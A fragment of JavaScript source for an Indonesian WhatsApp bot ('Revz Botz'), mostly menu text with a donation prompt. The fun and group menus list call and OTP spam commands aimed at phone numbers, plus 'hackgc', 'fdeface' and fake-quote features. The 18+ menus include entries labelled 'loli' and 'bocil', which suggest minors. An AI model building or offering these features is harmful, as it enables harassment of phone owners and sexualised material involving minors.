${gaya1} *Wa Version :* ${wa_version}
${gaya1} *Total Pengguna :* ${_registered.length}
${gaya1} *Mode :* ${self ? "Self" : "Public"}
${gaya1} *Autoread* : ${autoread ? "Aktif" : "Off"}
${gaya1} *Autoketik* : ${autoketik ? "Aktif" : "Off"}
${gaya1} *Autovn* : ${autovn ? "Aktif" : "Off"}

\`\`\`❏「 INFO USER 」\`\`\`
${gaya1} *Nama* : ${pushname}
${gaya1} *Bio* : ${bio_user}
${gaya1} *Nomor* : @${senderr.split('@')[0]}
${gaya1} *Status* : ${isOwner ? 'Owner' : 'User'}
`
		teks =
			`_Silakan Pilih Tombol Di Bawah_
_Pilih Salah Satu Jika WhatsApp Gb_
_Silakan Ketik ${prefix}command / ${prefix}allmenu_`
		gbutsan = [
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'LIST MENU' }, type: 1 },
			{ buttonId: `${prefix}allmenu`, buttonText: { displayText: 'ALL MENU' }, type: 1 },
			
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnpIL = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${pil}`,
			footerText: teks,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnpIL, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		const sound = fs.readFileSync('./media/dijeh.mp3')
		Revoer.sendMessage(from, sound, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi })
		break
case 'command':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
		listMsg = {
			"title": "*R E V Z B O T Z*",
buttonText: '𝗠𝗘𝗡𝗨',
footerText: `*© ${ownername}*`,
description: `Hai kak @${senderr.split('@')[0]}, Silahkan pilih menu disini`,
sections: [
{
		"title": `${tanggal} - ${time} WIB`,
	    "description": `BACA DULU JANGAN ASAL PENCET TERUS GK NGERTI`,
		rows: [
			{
				"title": "🦋ALL MENU🦋",
				"description": `MENAMPILKAN SEMUA LIST FITUR`,
				"rowId": `${prefix}allmenu`
			},
{
"title": "GROUP MENU",
"description": `Menampilkan List Fitur Khusus Group`,
"rowId": `${prefix}grupmenu`
},
{
"title": "DOWNLOAD MENU",
"description": `Menampilkan List Fitur Untuk Download`,
"rowId": `${prefix}downloadmenu`
},
{
"title": "MAKER MENU",
"description": `Menampilkan List Fitur Untuk Membuatkan Logo`,
"rowId": `${prefix}makermenu`
	},
	{
		"title": "MYSTERY MENU",
		"description": `UNLOCK KETIKA KAMU BERDONASI KE BOT!`,
		"rowId": `${prefix}bugmenu`
	},
{
"title": "RANDOM TEXT",
"description": `Menampilkan List Fitur Random Teks`,
"rowId": `${prefix}randomtext`
},
{
"title": "RANDOM IMAGE",
"description": `Menampilkan List Fitur Random Foto`,
"rowId": `${prefix}randomimage`
},
{
"title": "RANDOM VIDEO",
"description": `Menampilkan List Fitur Random Video`,
"rowId": `${prefix}randomvideo`
},
{
"title": "ASUPAN MENU",
"description": `Menampilkan List Fitur Asupan 18+`,
"rowId": `${prefix}asupanmenu`
},
{
"title": "CECAN MENU",
"description": `Menampilkan List Fitur Cecan Dan Cogan`,
"rowId": `${prefix}cecanmenu`
},
{
"title": "ANIME MENU",
"description": `Menampilkan List Fitur Anime`,
"rowId": `${prefix}animemenu`
},
{
"title": "NSFW MENU",
"description": `Menampilkan List Fitur Nsfw 18+`,
"rowId": `${prefix}nsfwmenu`
},
{
"title": "STICKER MENU",
"description": `Menampilkan List Fitur Sticker`,
"rowId": `${prefix}stickermenu`
},
{
"title": "OTHER MENU",
"description": `Menampilkan List Fitur Lainnya`,
"rowId": `${prefix}othermenu`
	},
	{
		"title": "EDITOR PHOTO & VIDEO",
		"description": `Menampilkan List Fitur Editor`,
		"rowId": `${prefix}editmenu`
	},
	{
		"title": "VOICE EDIT MENU",
		"description": `Menampilkan List Fitur Audio Edit`,
		"rowId": `${prefix}audiomenu`
	},
{
"title": "OWNER MENU",
"description": `Menampilkan List Fitur Khusus Owner`,
"rowId": `${prefix}ownermenu`
	},
	{
		"title": "FUN MENU",
		"description": `Menampilkan Fun Menu Untuk Menghilangkan Gabut`,
		"rowId": `${prefix}funmenu`
    }
]
}],
listType: 1
}
Revoer.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [senderr]},quoted:fgi})
		break
	
	case 'abcde':
	case 'sewabot':
	case 'donasi':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (isDonasi) return reply(`Kamu Sudah Donasi Sebelumnya`)
		scan = fs.readFileSync('./media/scan.jpeg')
		donate = `
Hai Orang *Baik!* Mau Donasi? Boleh Bisa Unlock Fitur Loh
Yuk Silahkan Donasi Ke Nomor Dibawah Ini :

*Dana* : 085736891082
*Gopay* : 085736891082
*Pulsa* : 0895338578959
*E-Wallet Non Premium?* : Scan QRIS Diatas

Terima Kasih!
`
		gbutsan = [
			{ buttonId: `${prefix}owner`, buttonText: { displayText: 'CHAT OWNER' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, scan , image, { thumbnail: ofrply })
		const sendBtnDns = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${donate}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnDns, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

case 'allmenu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		let mnu = Revoer.prepareMessageFromContent(from, {
			"orderMessage": {
				"itemCount": 999098123, "thumbnail": fs.readFileSync(`./media/vanz.jpeg`), "surface": 'CATALOG', 'message': `
R E V Z B O T Z

*ALL MENU SHOW*

*「 GRUP MENU 」*

${gaya2} ${prefix}antilink _on / off_
${gaya2} ${prefix}antivirtex _on / off_
${gaya2} ${prefix}welcome _on / off_
${gaya2} ${prefix}nsfw _on / off_
${gaya2} ${prefix}group _buka / tutup_
${gaya2} ${prefix}promote _@tag / reply_
${gaya2} ${prefix}demote _@tag / reply_
${gaya2} ${prefix}add _628xx_
${gaya2} ${prefix}kick _@tag / reply_
${gaya2} ${prefix}setpp _reply_
${gaya2} ${prefix}setdesc _teks_
${gaya2} ${prefix}setname _teks_
${gaya2} ${prefix}hidetag _teks_
${gaya2} ${prefix}kontak _628x|Nama_
${gaya2} ${prefix}kontag _@tag|Nama_
${gaya2} ${prefix}sticktag _Reply Sticker_
${gaya2} ${prefix}totag _Reply Image_
${gaya2} ${prefix}promoteall
${gaya2} ${prefix}demoteall
${gaya2} ${prefix}listadmin
${gaya2} ${prefix}grupowner
${gaya2} ${prefix}linkgrup
${gaya2} ${prefix}infogrup
${gaya2} ${prefix}listonline
${gaya2} ${prefix}resetlinkgrup
${gaya2} ${prefix}notif
${gaya2} ${prefix}fitnah
${gaya2} ${prefix}hackgc _Name_
${gaya2} ${prefix}fdeface

*「 DOWNLOAD MENU 」*

${gaya2} ${prefix}ytmp3 _Link_
${gaya2} ${prefix}ytmp4 _Link_
${gaya2} ${prefix}tiktok _Link_
${gaya2} ${prefix}tiktokwm _Link_
${gaya2} ${prefix}tiktoknowm _Link_
${gaya2} ${prefix}tiktokaudio _Link_
${gaya2} ${prefix}play _Judul_
${gaya2} ${prefix}instadl _Link_
${gaya2} ${prefix}gimage _query_
${gaya2} ${prefix}nhentaipdf (kode nuklir)


*「 FUN MENU 」*

${gaya2} ${prefix}tictactoe @Tag Member
${gaya2} ${prefix}delttc
${gaya2} ${prefix}slot
${gaya2} ${prefix}suit
${gaya2} ${prefix}susunkata
${gaya2} ${prefix}simi
${gaya2} ${prefix}kerangajaib
${gaya2} ${prefix}iqtest (nama)
${gaya2} ${prefix}spamtelpon (821xxxxx)
${gaya2} ${prefix}spamolx (62821xxxxx)
${gaya2} ${prefix}seberapagay
${gaya2} ${prefix}seberapacantik
${gaya2} ${prefix}seberapatolol
${gaya2} ${prefix}seberapaganteng


*「 MAKER MENU 」*

${gaya2} ${prefix}blackpink _Teks_
${gaya2} ${prefix}nulis _Teks_
${gaya2} ${prefix}makequote _Teks_|_Namalu_
${gaya2} ${prefix}halloween _Teks_
${gaya2} ${prefix}halloween2 _Teks_
${gaya2} ${prefix}3dgradient _Teks_
${gaya2} ${prefix}naturalleaves _Teks_
${gaya2} ${prefix}dropwater _Teks_
${gaya2} ${prefix}blood _Teks_
${gaya2} ${prefix}blood2 _Teks_
${gaya2} ${prefix}snow _Teks_
${gaya2} ${prefix}cloud _Teks_
${gaya2} ${prefix}neondevil _Teks_
${gaya2} ${prefix}neon _Teks_
${gaya2} ${prefix}glowingneonlight _Teks_
${gaya2} ${prefix}neonlight _Teks_
${gaya2} ${prefix}neonlight2 _Teks_
${gaya2} ${prefix}neonlight3 _Teks_
${gaya2} ${prefix}greenneon _Teks_
${gaya2} ${prefix}toxic _Teks_
${gaya2} ${prefix}matrix _Teks_
${gaya2} ${prefix}thunder _Teks_
${gaya2} ${prefix}thunder2 _Teks_
${gaya2} ${prefix}bokeh _Teks_
${gaya2} ${prefix}carbontext _Teks_
${gaya2} ${prefix}christmas _Teks_
${gaya2} ${prefix}breakwall _Teks_
${gaya2} ${prefix}roadwarning _Teks_
${gaya2} ${prefix}engraved3d _Teks_
${gaya2} ${prefix}embossed _Teks_
${gaya2} ${prefix}3dstone _Teks_
${gaya2} ${prefix}futuristic _Teks_
${gaya2} ${prefix}sketch _Teks_
${gaya2} ${prefix}bluecircuit _Teks_
${gaya2} ${prefix}space _Teks_
${gaya2} ${prefix}magmahot _Teks_
${gaya2} ${prefix}artpapercut _Teks_
${gaya2} ${prefix}3dluxurygold _Teks_
${gaya2} ${prefix}robotr2d2 _Teks_
${gaya2} ${prefix}harrypotter _Teks_
${gaya2} ${prefix}glitch3 _Teks_
${gaya2} ${prefix}greenhorror _Teks_
${gaya2} ${prefix}horrorgift _Teks_
${gaya2} ${prefix}erodedmetal _Teks_
${gaya2} ${prefix}3dglowingmetal _Teks_
${gaya2} ${prefix}blackmetal _Teks_
${gaya2} ${prefix}bluemetal _Teks_
${gaya2} ${prefix}shynimetal _Teks_
${gaya2} ${prefix}rustymetal _Teks_
${gaya2} ${prefix}metalpurple _Teks_
${gaya2} ${prefix}metalrainbow _Teks_
${gaya2} ${prefix}metaldarkgold _Teks_
${gaya2} ${prefix}colorfullluxurymetal _Teks_
${gaya2} ${prefix}glossybluemetal _Teks_
${gaya2} ${prefix}3dglossymetal _Teks_
${gaya2} ${prefix}3ddeepseametal _Teks_
${gaya2} ${prefix}leddisplayscreen _Teks_
${gaya2} ${prefix}metallic _Teks_
${gaya2} ${prefix}glossymetallic _Teks_
${gaya2} ${prefix}christmastree _Teks_
${gaya2} ${prefix}sparklesmerrychristmas _Teks_
${gaya2} ${prefix}countryflag3d _Teks_
${gaya2} ${prefix}americanflag3d _Teks_
${gaya2} ${prefix}3dscfi _Teks_
${gaya2} ${prefix}3drainbow _Teks_
${gaya2} ${prefix}3dwaterpipe _Teks_
${gaya2} ${prefix}3dchrome _Teks_
${gaya2} ${prefix}bluegem _Teks_
${gaya2} ${prefix}purplegem _Teks_
${gaya2} ${prefix}pinkcandy _Teks_
${gaya2} ${prefix}transformer _Teks_
${gaya2} ${prefix}berry _Teks_
${gaya2} ${prefix}brokenglass _Teks_
${gaya2} ${prefix}3drealistic _Teks_
${gaya2} ${prefix}3dunderwater _Teks_
${gaya2} ${prefix}writeinsandsummerbeach _Teks_
${gaya2} ${prefix}sandwriting _Teks_
${gaya2} ${prefix}foilballoon _Teks_
${gaya2} ${prefix}3dglue _Teks_
${gaya2} ${prefix}1917 _Teks_
${gaya2} ${prefix}minion _Teks_
${gaya2} ${prefix}doubleexposure _Teks_
${gaya2} ${prefix}holographic3d _Teks_
${gaya2} ${prefix}deluxegold _Teks_
${gaya2} ${prefix}deluxesilver _Teks_
${gaya2} ${prefix}glossycarbon _Teks_
${gaya2} ${prefix}fabric _Teks_
${gaya2} ${prefix}xmascards3d _Teks_
${gaya2} ${prefix}wicker _Teks_
${gaya2} ${prefix}fireworksparkle _Teks_
${gaya2} ${prefix}skeleton _Teks_
${gaya2} ${prefix}ultragloss _Teks_
${gaya2} ${prefix}denim _Teks_
${gaya2} ${prefix}decorategreen _Teks_
${gaya2} ${prefix}peridot _Teks_
${gaya2} ${prefix}rock _Teks_
${gaya2} ${prefix}lava _Teks_
${gaya2} ${prefix}rainbowequalizer _Teks_
${gaya2} ${prefix}purpleglass _Teks_
${gaya2} ${prefix}decorativeglass _Teks_
${gaya2} ${prefix}chocolatecake _Teks_
${gaya2} ${prefix}strawberry _Teks_
${gaya2} ${prefix}koifish _Teks_
${gaya2} ${prefix}bread _Teks_
${gaya2} ${prefix}3dbox _Teks_
${gaya2} ${prefix}freeadvancedglow _Teks_
${gaya2} ${prefix}honey _Teks_
${gaya2} ${prefix}marble _Teks_
${gaya2} ${prefix}marbleslabs _Teks_
${gaya2} ${prefix}icecold _Teks_
${gaya2} ${prefix}fruitjuice _Teks_
${gaya2} ${prefix}abstragold _Teks_
${gaya2} ${prefix}biscuit _Teks_
${gaya2} ${prefix}bagel _Teks_
${gaya2} ${prefix}wood _Teks_
${gaya2} ${prefix}hexagolden _Teks_
${gaya2} ${prefix}wonderfulgraffitiart _Teks_
${gaya2} ${prefix}8bit _Teks1&Teks2_
${gaya2} ${prefix}pornhub _Teks1&Teks2_
${gaya2} ${prefix}glitch _Teks1&Teks2_
${gaya2} ${prefix}glitch2 _Teks1&Teks2_
${gaya2} ${prefix}layered _Teks1&Teks2_
${gaya2} ${prefix}3dsteel _Teks1&Teks2_
${gaya2} ${prefix}realistic _Teks1&Teks2_
${gaya2} ${prefix}lionlogo _Teks1&Teks2_
${gaya2} ${prefix}ninjalogo _Teks1&Teks2_
${gaya2} ${prefix}wolf _Teks1&Teks2_
${gaya2} ${prefix}wolf2 _Teks1&Teks2_
${gaya2} ${prefix}halloween3 _Teks1&Teks2_
${gaya2} ${prefix}marvel _Teks1&Teks2_
${gaya2} ${prefix}marvel2 _Teks1&Teks2_
${gaya2} ${prefix}cinematichorror _Teks1&Teks2_
${gaya2} ${prefix}avengers _Teks1&Teks2_
${gaya2} ${prefix}graffiti3 _Teks1&Teks2_
${gaya2} ${prefix}captainamerica _Teks1&Teks2_
${gaya2} ${prefix}girlneko _Teks1&Teks2_
${gaya2} ${prefix}sadboy _Teks1&Teks2_
${gaya2} ${prefix}makerkaneki _Teks1&Teks2_
${gaya2} ${prefix}rem _Teks1&Teks2_
${gaya2} ${prefix}lolimaker _Teks1&Teks2_
${gaya2} ${prefix}gura _Teks1&Teks2_
${gaya2} ${prefix}donaldtweet _Text_
${gaya2} ${prefix}tololserti _Text_
${gaya2} ${prefix}bearlogo _Text_
${gaya2} ${prefix}catlogo _Text_
${gaya2} ${prefix}foxlogo _Text_
${gaya2} ${prefix}zenitshu _Teks1&Teks2_
${gaya2} ${prefix}tanjirou _Teks1&Teks2_
${gaya2} ${prefix}mikasagfx _Teks1&Teks2_
${gaya2} ${prefix}doumagfx _Teks1&Teks2_
${gaya2} ${prefix}doumagfx2 _Teks_
${gaya2} ${prefix}luffygfx _Teks1&Teks2_

*「 RANDOM IMAGE 」*

${gaya2} ${prefix}ppcouple
${gaya2} ${prefix}meme
${gaya2} ${prefix}memeindo
${gaya2} ${prefix}quotesimage
${gaya2} ${prefix}katakataimage
${gaya2} ${prefix}renungan
${gaya2} ${prefix}darkjokes
${gaya2} ${prefix}aesthetic
${gaya2} ${prefix}wallpaperhacker
${gaya2} ${prefix}wallpaperhacker2
${gaya2} ${prefix}wallpaperharley
${gaya2} ${prefix}wallpaperjoker
${gaya2} ${prefix}wallpaperpubg
${gaya2} ${prefix}wallpaperhp
${gaya2} ${prefix}wallpaperhp2
${gaya2} ${prefix}wallpaperkpop
${gaya2} ${prefix}wallpaperblackpink
${gaya2} ${prefix}wallpapergame
${gaya2} ${prefix}cosplayer


*「 RANDOM TEXT 」*

${gaya2} ${prefix}faktaunik
${gaya2} ${prefix}faktahorror
${gaya2} ${prefix}truth
${gaya2} ${prefix}dare
${gaya2} ${prefix}pantun
${gaya2} ${prefix}puisi
${gaya2} ${prefix}quotes
${gaya2} ${prefix}quoteskanye
${gaya2} ${prefix}quotesislami
${gaya2} ${prefix}quotesanime
${gaya2} ${prefix}quotesdilan
${gaya2} ${prefix}quotesff
${gaya2} ${prefix}quotespubg
${gaya2} ${prefix}quoteshacker
${gaya2} ${prefix}katabijak
${gaya2} ${prefix}katailham
${gaya2} ${prefix}katasindiran
${gaya2} ${prefix}katabucin
${gaya2} ${prefix}katabucin2
${gaya2} ${prefix}kataml
${gaya2} ${prefix}katagalau
${gaya2} ${prefix}katagombal
${gaya2} ${prefix}cerpen
${gaya2} ${prefix}cersex
${gaya2} ${prefix}cercin
${gaya2} ${prefix}cerror


*「 RANDOM VIDEO 」*

${gaya2} ${prefix}beatvn
${gaya2} ${prefix}jedagjedugff
${gaya2} ${prefix}jedagjedugml
${gaya2} ${prefix}jedagjedugpubg
${gaya2} ${prefix}storywa
${gaya2} ${prefix}storygalau
${gaya2} ${prefix}storytruk
${gaya2} ${prefix}storybus
${gaya2} ${prefix}storyanime
${gaya2} ${prefix}clipclap
${gaya2} ${prefix}tiktokporn


*「 CECAN MENU 」*

${gaya2} ${prefix}cogan
${gaya2} ${prefix}cecan
${gaya2} ${prefix}cecan2
${gaya2} ${prefix}cogan2
${gaya2} ${prefix}jeni
${gaya2} ${prefix}jiso
${gaya2} ${prefix}justina
${gaya2} ${prefix}lisa
${gaya2} ${prefix}rose
${gaya2} ${prefix}ryujin
${gaya2} ${prefix}china
${gaya2} ${prefix}vietnam
${gaya2} ${prefix}thainlad
${gaya2} ${prefix}indonesia
${gaya2} ${prefix}korea
${gaya2} ${prefix}japan
${gaya2} ${prefix}malaysia


*「 ANIME MENU 」*

${gaya2} ${prefix}naruto
${gaya2} ${prefix}loli
${gaya2} ${prefix}waifu
${gaya2} ${prefix}neko
${gaya2} ${prefix}husbu
${gaya2} ${prefix}milf
${gaya2} ${prefix}cosplay
${gaya2} ${prefix}nekonime
${gaya2} ${prefix}shota
${gaya2} ${prefix}wallml
${gaya2} ${prefix}akira
${gaya2} ${prefix}akiyama
${gaya2} ${prefix}ana
${gaya2} ${prefix}asuna
${gaya2} ${prefix}ayuzawa
${gaya2} ${prefix}boruto
${gaya2} ${prefix}chiho
${gaya2} ${prefix}chitoge
${gaya2} ${prefix}deidara
${gaya2} ${prefix}eba
${gaya2} ${prefix}elaina
${gaya2} ${prefix}emilia
${gaya2} ${prefix}erza
${gaya2} ${prefix}gremory
${gaya2} ${prefix}hestia
${gaya2} ${prefix}hinata
${gaya2} ${prefix}isuzu
${gaya2} ${prefix}itachi
${gaya2} ${prefix}itori
${gaya2} ${prefix}kagura
${gaya2} ${prefix}kakasih
${gaya2} ${prefix}kaori
${gaya2} ${prefix}kaneki
${gaya2} ${prefix}kotori
${gaya2} ${prefix}kurumi
${gaya2} ${prefix}madara
${gaya2} ${prefix}mikasa
${gaya2} ${prefix}miku
${gaya2} ${prefix}minato
${gaya2} ${prefix}nezuko
${gaya2} ${prefix}rize
${gaya2} ${prefix}sagiri
${gaya2} ${prefix}sakura
${gaya2} ${prefix}sasuke
${gaya2} ${prefix}shina
${gaya2} ${prefix}shinka
${gaya2} ${prefix}shinomiya
${gaya2} ${prefix}shizuka
${gaya2} ${prefix}tejina
${gaya2} ${prefix}toukachan
${gaya2} ${prefix}tsunade
${gaya2} ${prefix}yotsuba
${gaya2} ${prefix}yuki
${gaya2} ${prefix}yumeko
${gaya2} ${prefix}fanart
${gaya2} ${prefix}nino
${gaya2} ${prefix}manga


*「 NSFW MENU 」*

${gaya2} ${prefix}ass
${gaya2} ${prefix}ahegao
${gaya2} ${prefix}bdsm
${gaya2} ${prefix}blowjob
${gaya2} ${prefix}cuckold
${gaya2} ${prefix}cum
${gaya2} ${prefix}ero
${gaya2} ${prefix}femdom
${gaya2} ${prefix}foot
${gaya2} ${prefix}gangbang
${gaya2} ${prefix}glasses
${gaya2} ${prefix}hentai
${gaya2} ${prefix}jahy
${gaya2} ${prefix}masturbation
${gaya2} ${prefix}neko
${gaya2} ${prefix}orgy
${gaya2} ${prefix}panties
${gaya2} ${prefix}pussy
${gaya2} ${prefix}thighs
${gaya2} ${prefix}yuri
${gaya2} ${prefix}hentaivid

*「 STICKER MENU 」*

${gaya2} ${prefix}sticker _reply_
${gaya2} ${prefix}toimg _reply_
${gaya2} ${prefix}smeme Atas|Bawah
${gaya2} ${prefix}ttp _Teks_
${gaya2} ${prefix}ttp2 _Teks_
${gaya2} ${prefix}ttp3 _Teks_
${gaya2} ${prefix}ttp4 _Teks_
${gaya2} ${prefix}ttp5 _Teks_
${gaya2} ${prefix}ttp6 _Teks_
${gaya2} ${prefix}ttp7 _Teks_
${gaya2} ${prefix}attp _Teks_
${gaya2} ${prefix}stikeramongus
${gaya2} ${prefix}stikerdoge
${gaya2} ${prefix}stikerpatrick
${gaya2} ${prefix}randomsticker
${gaya2} ${prefix}stikergura

*「 OTHER MENU 」*

${gaya2} ${prefix}runtime
${gaya2} ${prefix}speed
${gaya2} ${prefix}infosc
${gaya2} ${prefix}sewabot
${gaya2} ${prefix}payment
${gaya2} ${prefix}owner
${gaya2} ${prefix}sc
${gaya2} ${prefix}ssweb _Url_
${gaya2} ${prefix}delete _Reply pesan bot_
${gaya2} ${prefix}shorturl
${gaya2} ${prefix}kisahnabi (Muhammad)
${gaya2} ${prefix}whois (url)
${gaya2} ${prefix}tts (teks)
${gaya2} ${prefix}citacita
${gaya2} ${prefix}fancytext (text)
${gaya2} ${prefix}qrcode (teks/link)
${gaya2} ${prefix}namajepang
${gaya2} ${prefix}morse _Text_
${gaya2} ${prefix}morsetr _MorseCode_
${gaya2} ${prefix}hitungwr _Match/Wr Sekarang/Wr Tujuan_
${gaya2} ${prefix}stalkig _Username_
${gaya2} ${prefix}stalktiktok _Username_


*「 EDITOR MENU 」*

PREMIUM ONLY HARAP CEK DI #command


*「 OWNER MENU 」*

${gaya2} ${prefix}bc _Teks_
${gaya2} ${prefix}bc2 _Teks_
${gaya2} ${prefix}bcgc _Teks_
${gaya2} ${prefix}setnamabot _Teks_
${gaya2} ${prefix}setbio _Teks_
${gaya2} ${prefix}setppbot _Reply Image_
${gaya2} ${prefix}autoread _On / Off_
${gaya2} ${prefix}autoketik _On / Off_
${gaya2} ${prefix}autovn _On / Off_
${gaya2} ${prefix}clearall
${gaya2} ${prefix}public
${gaya2} ${prefix}self

*「 MYSTERY MENU 」*

PREMIUM ONLY
Udah Donasi? CEK DI #command

*「 VOICE CHANGER 」*

PREMIUM ONLY 
Udah Donasi? CEK DI #command

*「 ASUPAN MENU 」*

${gaya2} ${prefix}asupan
${gaya2} ${prefix}asupanloli
${gaya2} ${prefix}hijaber
${gaya2} ${prefix}bocil
${gaya2} ${prefix}rikagusriani
${gaya2} ${prefix}santuy
${gaya2} ${prefix}ukhty
${gaya2} ${prefix}gheayubi
${gaya2} ${prefix}bacol

*◤Special Thanks To◢*
*•ALL CREATOR BOT INDONESIA*
-==[Bot WhatsApp : Revz]-==` }
		}, { quoted: ftrol, contextInfo: { "forwardingScore": 999, "isForwarded": true, sendEphemeral: true, mentionedJid: [from] } })
		Revoer.relayWAMessage(mnu, { waitForAck: true })
		break
case 'grupmenu':
case 'groupmenu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 GRUP MENU 」*

${gaya2} ${prefix}antilink _on / off_
${gaya2} ${prefix}antivirtex _on / off_
${gaya2} ${prefix}welcome _on / off_
${gaya2} ${prefix}nsfw _on / off_
${gaya2} ${prefix}group _buka / tutup_
${gaya2} ${prefix}promote _@tag / reply_
${gaya2} ${prefix}demote _@tag / reply_
${gaya2} ${prefix}add _628xx_
${gaya2} ${prefix}kick _@tag / reply_
${gaya2} ${prefix}setpp _reply_
${gaya2} ${prefix}setdesc _teks_
${gaya2} ${prefix}setname _teks_
${gaya2} ${prefix}hidetag _teks_
${gaya2} ${prefix}kontak _628x|Nama_
${gaya2} ${prefix}kontag _@tag|Nama_
${gaya2} ${prefix}sticktag _Reply Sticker_
${gaya2} ${prefix}totag _Reply Image_
${gaya2} ${prefix}promoteall
${gaya2} ${prefix}demoteall
${gaya2} ${prefix}listadmin
${gaya2} ${prefix}grupowner
${gaya2} ${prefix}linkgrup
${gaya2} ${prefix}infogrup
${gaya2} ${prefix}listonline
${gaya2} ${prefix}resetlinkgrup
${gaya2} ${prefix}notif
${gaya2} ${prefix}fitnah
${gaya2} ${prefix}hackgc _Name_
${gaya2} ${prefix}fdeface
`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn1 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn1, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break
	 
case 'downloadmenu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 DOWNLOAD MENU 」*

${gaya2} ${prefix}ytmp3 _Link_
${gaya2} ${prefix}ytmp4 _Link_
${gaya2} ${prefix}tiktok _Link_
${gaya2} ${prefix}tiktokwm _Link_
${gaya2} ${prefix}tiktoknowm _Link_
${gaya2} ${prefix}tiktokaudio _Link_
${gaya2} ${prefix}play _Judul_
${gaya2} ${prefix}instadl _Link_
${gaya2} ${prefix}gimage _query_
${gaya2} ${prefix}nhentaipdf (kode nuklir)`

		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn2 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn2, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break
	case 'funmenu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		menu =
			`*「 FUN MENU 」*

${gaya2} ${prefix}tictactoe @Tag Member
${gaya2} ${prefix}delttc
${gaya2} ${prefix}slot
${gaya2} ${prefix}suit
${gaya2} ${prefix}susunkata
${gaya2} ${prefix}simi
${gaya2} ${prefix}kerangajaib
${gaya2} ${prefix}iqtest (nama)
${gaya2} ${prefix}spamtelpon (821xxxxx)
${gaya2} ${prefix}spamolx (62821xxxxx)
${gaya2} ${prefix}seberapagay
${gaya2} ${prefix}seberapacantik
${gaya2} ${prefix}seberapatolol
${gaya2} ${prefix}seberapaganteng
`

		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn3 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn3, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

case 'makermenu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 MAKER MENU 」*

${gaya2} ${prefix}blackpink _Teks_
${gaya2} ${prefix}nulis _Teks_
${gaya2} ${prefix}makequote _Teks_|_Namalu_
${gaya2} ${prefix}halloween _Teks_
${gaya2} ${prefix}halloween2 _Teks_
${gaya2} ${prefix}3dgradient _Teks_
${gaya2} ${prefix}naturalleaves _Teks_
${gaya2} ${prefix}dropwater _Teks_
${gaya2} ${prefix}blood _Teks_
${gaya2} ${prefix}blood2 _Teks_
${gaya2} ${prefix}snow _Teks_
${gaya2} ${prefix}cloud _Teks_
${gaya2} ${prefix}neondevil _Teks_
${gaya2} ${prefix}neon _Teks_
${gaya2} ${prefix}glowingneonlight _Teks_
${gaya2} ${prefix}neonlight _Teks_
${gaya2} ${prefix}neonlight2 _Teks_
${gaya2} ${prefix}neonlight3 _Teks_
${gaya2} ${prefix}greenneon _Teks_
${gaya2} ${prefix}toxic _Teks_
${gaya2} ${prefix}matrix _Teks_
${gaya2} ${prefix}thunder _Teks_
${gaya2} ${prefix}thunder2 _Teks_
${gaya2} ${prefix}bokeh _Teks_
${gaya2} ${prefix}carbontext _Teks_
${gaya2} ${prefix}christmas _Teks_
${gaya2} ${prefix}breakwall _Teks_
${gaya2} ${prefix}roadwarning _Teks_
${gaya2} ${prefix}engraved3d _Teks_
${gaya2} ${prefix}embossed _Teks_
${gaya2} ${prefix}3dstone _Teks_
${gaya2} ${prefix}futuristic _Teks_
${gaya2} ${prefix}sketch _Teks_
${gaya2} ${prefix}bluecircuit _Teks_
${gaya2} ${prefix}space _Teks_
${gaya2} ${prefix}magmahot _Teks_
${gaya2} ${prefix}artpapercut _Teks_
${gaya2} ${prefix}3dluxurygold _Teks_
